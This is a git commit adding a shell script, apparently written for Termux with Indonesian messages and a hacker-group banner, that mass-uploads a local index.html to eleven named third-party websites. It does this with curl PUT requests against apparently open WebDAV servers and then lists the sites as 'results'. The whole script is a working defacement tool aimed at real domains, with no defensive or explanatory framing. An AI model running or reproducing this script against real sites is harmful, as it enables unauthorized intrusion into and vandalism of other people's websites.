5ac65030d241cba7b0aa72088d9c7ce7a66c0296
KaCeTe <53702626+KaCeTe@users.noreply.github.com>
2019-08-04 20:37:02 +0700

    Nothing

---
+++ Kdav.sh
@@ -0,0 +1,56 @@
+blue='\033[34;1m'
+green='\033[32;1m'
+purple='\033[35;1m'                                                cyan='\033[36;1m'
+red='\033[31;1m'
+white='\033[37;1m'
+yellow='\033[33;1m'
+figlet -t KCT INDO | lolcat
+echo $red  "   #==================================#   "
+echo $blue "   |    WEBDAV AUTO INDEX BY KCT                 |   "
+echo $blue "   | CREATOR : P4TR1CK Chuzz                         |   "
+echo $blue "   | Support : Om Adi [ Kimcil.ID.22]                   |   "
+echo $blue "   | Versi   : 1.0                                                       |   "
+echo $blue "   | Percobaan Kak...10 Web dulu                       |   "
+echo $red  "   #==================================#   "
+sleep 2
+echo $purple "Rename Dulu Script Dengan index.html"
+sleep 3
+echo
+curl -T /storage/emulated/0/index.html http://ayk.co.za/
+echo $green "Done 1 Gan..."
+curl -T /storage/emulated/0/index.html http://whadiz.com/
+echo $green "Done 2 Gan..."
+curl -T /storage/emulated/0/index.html http://scnc.co.za/
+echo $green "Done 3 Gan..."
+curl -T /storage/emulated/0/index.html http://esfml.com
+echo $green "Done 4 Gan..."
+curl -T /storage/emulated/0/index.html http://tressor.co.za
+echo $green "Done 5 Gan..."
+curl -T /storage/emulated/0/index.html http://tcmgroup.co.za
+echo $green "Done 6 Gan..."
+curl -T /storage/emulated/0/index.html http://stand66.com
+echo $green "Done 7 Gan..."
+curl -T /storage/emulated/0/index.html http://mix007.co.za
+echo $green "Done 8 Gan..."
+curl -T /storage/emulated/0/index.html http://lwrm.co.za
+echo $green "Done 9 Gan..."
+curl -T /storage/emulated/0/index.html http://contsol.co.za/
+echo $green "Done 10 Gan..."
+curl -T /storage/emulated/0/index.html http://uzingela.co.za
+echo $green "Done 11 Gan..."
+sleep 2
+echo $yellow "             PROSES PENGAMBILAN HASIL...   "
+sleep 3
+echo $green "HASIL :    "
+echo $yellow "http://ayk.co.za"
+echo $yellow "http://whadiz.com"
+echo $yellow "http://scnc.co.za"
+echo $yellow "http://esfml.com"
+echo $yellow "http://tressor.co.za"
+echo $yellow "http://tcmgroup.co.za"
+echo $yellow "http://stand66.com"
+echo $yellow "http://mix007.co.za"
+echo $yellow "http://lwrm.co.za"
+echo $yellow "http://contsol.co.za"
+echo $yellow "http://uzingela.co.za"
+exit
